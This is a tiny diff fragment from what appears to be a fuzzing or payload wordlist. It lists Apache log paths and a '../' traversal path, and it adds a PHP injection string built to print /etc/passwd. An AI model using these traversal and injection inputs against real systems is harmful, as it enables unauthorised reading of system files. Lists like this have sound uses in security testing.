@@ -8,3 +8,4 @@
 /var/log/apache2/auth.log
 /var/log/apache2/access.log
 ../../../../../var/log/apache2/access.log
+' and die(show_source('/etc/passwd')) or '
